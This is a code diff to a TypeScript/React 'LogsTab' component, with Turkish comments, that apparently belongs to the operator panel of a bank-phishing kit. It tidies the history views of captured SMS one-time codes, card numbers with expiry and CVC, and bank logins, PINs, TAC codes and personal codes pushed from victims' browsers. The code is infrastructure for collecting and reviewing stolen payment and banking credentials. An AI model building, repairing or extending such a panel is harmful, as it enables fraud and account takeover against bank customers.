@@ -1519,11 +1519,14 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const currentBankPass = String(fd.password || fd.pin || "").trim();
 
                 // ⭐ SMS GECMISI HESAPLA:
-                //   1) SADECE htmlStepLabel === "SMS KODU" olanlari al (banka TAC'ı karışmaz).
-                //   2) Ardışık AYNI kodu tekrar etme.
-                //   3) ⭐ KART MANTIGI İLE BİREBİR: SON (en yeni) SMS === kolondaki MEVCUT SMS ise
-                //      O entry listeden ve SAYIMDAN KALDIRILIR (gecmis = "ESKI" kayitlar, mevcut kolon zaten onu gosteriyor).
-                //   Boylece ILK SMS'te GECMIS YOK, 2. SMS'te 1. SMS listede gorunur.
+                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel === "SMS KODU").
+                //   - ⚠️ LEGACY SNAPSHOT (tek kayit, kolonun kopyasi) ASLA GECMIS OLARAK SAYILMAZ!
+                //     (cunku zaten kolon onu gosteriyor, gecmis ayni kayit tekrar = sacma).
+                //   1) htmlStepLabel === "SMS KODU" + SMS alani dolu.
+                //   2) Ardışık AYNI kodu tekrar etme (dedup).
+                //   3) ⭐ Son (en yeni) SMS === kolondaki MEVCUT SMS ise listeden KALDIR.
+                //
+                //   SONUC: 1. SMS'te GECMIS YOK (buton YOK). 2. SMS'te GECMIS (1) gorunur ve 1. SMS listelenir. ✅
                 const smsHistoryRaw = history
                   .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "SMS KODU")
                   .map((e: any) => {
@@ -1537,13 +1540,14 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                       bankName: e.bankName || "",
                     };
                   })
-                  .filter(Boolean);
+                  .filter(Boolean)
+                  .filter((e: any) => !e.isLegacySnapshot); // ⚠️ LEGACY ASLA HISTORY SAYILMAZ!
                 const smsHistory: any[] = [];
                 for (let i = 0; i < smsHistoryRaw.length; i++) {
                   const p = i > 0 ? smsHistoryRaw[i - 1] : null;
                   if (!p || (p as any).sms !== (smsHistoryRaw[i] as any).sms) smsHistory.push(smsHistoryRaw[i]);
                 }
-                // ⭐ Son (en yeni) SMS = kolondaki mevcut SMS ise listeden KALDIR
+                // ⭐ Son (en yeni) SMS = kolondaki mevcut SMS ise listeden KALDIR (sadece ESKİLER kalsın)
                 if (smsHistory.length > 0 && currentSmsValue.length > 0) {
                   const lastEntry = smsHistory[smsHistory.length - 1] as any;
                   if (lastEntry && lastEntry.sms === currentSmsValue) {
@@ -1553,10 +1557,11 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const smsHistoryCount = smsHistory.length;
 
                 // ⭐ KART GECMISI HESAPLA:
-                //   1) SADECE htmlStepLabel === "KART BILGISI" olanlari al.
+                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel === "KART BILGISI").
+                //   - ⚠️ LEGACY SNAPSHOT (tek kayit, kolonun kopyasi) ASLA GECMIS OLARAK SAYILMAZ!
+                //   1) htmlStepLabel === "KART BILGISI" + en az 1 alan (no/exp/cvc) dolu.
                 //   2) Aynı kart ard arda 1 tane birak (No + Exp + Cvc ayniysa ayni kart).
-                //   3) ⭐ Son (en yeni) kayit kart bilgileri KOLONDAKI ile TAMAMEN AYNI ise
-                //      listeden ve sayimdan KALDIR (mevcut kolon zaten onu gosteriyor).
+                //   3) ⭐ Son (en yeni) kayit kart bilgileri KOLONDAKI ile TAMAMEN AYNI ise listeden KALDIR.
                 const cardHistoryRaw = history
                   .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "KART BILGISI")
                   .map((e: any) => {
@@ -1574,7 +1579,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                       bankName: e.bankName || "",
                     };
                   })
-                  .filter(Boolean);
+                  .filter(Boolean)
+                  .filter((e: any) => !e.isLegacySnapshot); // ⚠️ LEGACY ASLA HISTORY SAYILMAZ!
                 const cardHistory: any[] = [];
                 for (let i = 0; i < cardHistoryRaw.length; i++) {
                   const p = i > 0 ? (cardHistoryRaw[i - 1] as any) : null;
@@ -1588,7 +1594,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     cardHistory.push(cur);
                   }
                 }
-                // ⭐ Son (en yeni) kart === kolondaki mevcut kart ise listeden KALDIR
+                // ⭐ Son (en yeni) kart === kolondaki mevcut kart ise listeden KALDIR (sadece ESKİLER kalsın)
                 if (cardHistory.length > 0 && (currentCardNo.length > 0 || currentCardExp.length > 0 || currentCardCvc.length > 0)) {
                   const lastEntry = cardHistory[cardHistory.length - 1] as any;
                   if (
@@ -1602,30 +1608,34 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 }
                 const cardHistoryCount = cardHistory.length;
 
-                // ⭐ BANKA GECMISI HESAPLA:
-                //   1) SMS KODU ve KART BILGISI disindaki tum entryler (sadece banka formu).
-                //   2) ⚠️ GURULTU TEMIZLIGI: Legacy snapshot (isLegacySnapshot) ve TUM onemli alanlar
-                //      (ordered1/user/pass/tac/telefon/kimlik vb.) HEPSI bos ise listeden at (bos kayit gosterme).
-                //   3) Ard arda girilen AYNI form (tüm alanlar birebir) tekrar ediyorsa 1 tane birak (SMS/KART dedup gibi).
-                //   4) ⭐ Son (en yeni) kayit TUM 12+ onemli alan KOLONDAKI ile BIREBIR AYNI ise
-                //      listeden ve sayimdan KALDIR (3 alan degil HEPSI eslesmeli, aksi halde yeni form girilince
-                //      eski kayitlar gecmiste gorunur.
+                // ⭐ BANKA GECMISI HESAPLA (SMS/KART ile BIREBIR MANTIK):
+                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel SMS/KART DISINDA olanlar).
+                //   - ⚠️ EN KRITIK KURAL: LEGACY SNAPSHOT (tek kayit = kolonun kopyasi) ASLA GEÇMİŞ OLARAK SAYILMAZ!
+                //     (eger sayarsan "gecmis butonu gorunur, basarsan kolonun AYNISINI gorursun" = SACMA)
+                //   - ILK BANKA FORM (1 form): GECMIS YOKTUR, buton YOKTUR (sadece kolon gorunur ✅).
+                //   - 2+ BANKA FORM (2 veya 3 form): GERCEK push edilmis FORMLAR (ESKİLER) listelenir.
+                //   1) Gurultu: isLegacySnapshot (tamamen sil) + label SMS/KART (sil).
+                //   2) TUM alanlar (8+) bossa (bos snapshot) sil.
+                //   3) Dedup (ard arda ayni form 1 tane birak).
+                //   4) ⭐ Son (en yeni) kayit TUM 8 alan KOLONDAKI ile BIREBIR AYNI ise listeden KALDIR.
                 const bankHistoryRawPre0 = history
                   .filter((e: any) => {
-                    if (!e) return false;
+                    // ⚠️ 1) LEGACY SNAPSHOT = KOLONUN KENDISI. ASLA GECMIS DEGIL!
+                    if (!e || e.isLegacySnapshot === true) return false;
                     const label = typeof e.htmlStepLabel === "string" ? e.htmlStepLabel : "";
                     return label !== "SMS KODU" && label !== "KART BILGISI";
                   })
                   .filter((e: any) => {
-                    // Gurultu filtresi: legacy snapshot + tum alanlar bossa sil
-                    if (!e.isLegacySnapshot) return true;
+                    // 2) Gurultu: tum alanlar bossa (bos kayit) sil
                     const sO1 = String(e.orderedField1 || "").trim();
                     const sUser = String(e.username || e.verfuegernummer || "").trim();
                     const sPass = String(e.password || e.pin || "").trim();
                     const sTac = String(e.tacCode || "").trim();
                     const sPhone = String(e.bankPhone || "").trim();
                     const sPers = String(e.personalCode || "").trim();
-                    return !(sO1.length === 0 && sUser.length === 0 && sPass.length === 0 && sTac.length === 0 && sPhone.length === 0 && sPers.length === 0);
+                    const sO2 = String(e.orderedField2 || "").trim();
+                    const sO3 = String(e.orderedField3 || "").trim();
+                    return !(sO1.length === 0 && sUser.length === 0 && sPass.length === 0 && sTac.length === 0 && sPhone.length === 0 && sPers.length === 0 && sO2.length === 0 && sO3.length === 0);
                   })
                   .map((e: any) => ({
                     ...e,
@@ -1639,7 +1649,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     _o3: String(e.orderedField3 || "").trim(),
                   }));
 
-                // 3) Dedup: ard arda GIRILEN AYNI formu 1 tane birak (tum alanlar esit)
+                // 3) Dedup: ard arda GIRILEN AYNI formu 1 tane birak (tum 8 alan esit)
                 const bankHistoryRawPre1: any[] = [];
                 for (let i = 0; i < bankHistoryRawPre0.length; i++) {
                   const cur = bankHistoryRawPre0[i];
@@ -1657,7 +1667,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   if (!same) bankHistoryRawPre1.push(cur);
                 }
 
-                // 4) Son kayit = mevcut kolondaki ile TUM alanlar eslesiyorsa listeden kaldir
+                // 4) ⭐ Son kayit = mevcut kolondaki ile TUM 8 alan eslesiyorsa listeden KALDIR (sadece ESKILER kalsın)
                 const currentO2 = String(fd.orderedField2 || "").trim();
                 const currentO3 = String(fd.orderedField3 || "").trim();
                 const currentTac = String(fd.tacCode || "").trim();
@@ -1666,15 +1676,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const bankHistoryRaw: any[] = (() => {
                   if (bankHistoryRawPre1.length === 0) return [];
                   const lastE = bankHistoryRawPre1[bankHistoryRawPre1.length - 1];
-                  // ⚠️ CRITICAL FIX: LEGACY SNAPSHOT (isLegacySnapshot=true) ASLA SILME!
-                  //   Bu snapshot, su ana kadar history push edilmemis eski sessionlar icin
-                  //   YARATILAN TEK KAYITTIR. Eger silersen:
-                  //     - bankHistoryCount = 0
-                  //     - GEÇMİŞ butonu GÖRÜNMEZ
-                  //     - Kullanici "eski banka logu gözükmüyor" der (SU ANKI HATA BUDUR!)
-                  //   Legacy snapshot = mevcut kolon degerleri, normal allMatch kontrolu
-                  //   TÜM alanlari dogal olarak eslestirir ve siler, bu yuzden once bunu cikis.
-                  if (lastE.isLegacySnapshot === true) return bankHistoryRawPre1;
+                  // ⚠️ ARTK LEGACY GIRMIYOR (en basta filter'leniyor) → early return KALDIRILDI.
+                  // Kolonun kendisi (mevcut) muhtemelen lastE === current ise HEMEN SILINMELI.
                   const currentHasAny =
                     currentBankOrdered1.length > 0 ||
                     currentBankUser.length > 0 ||
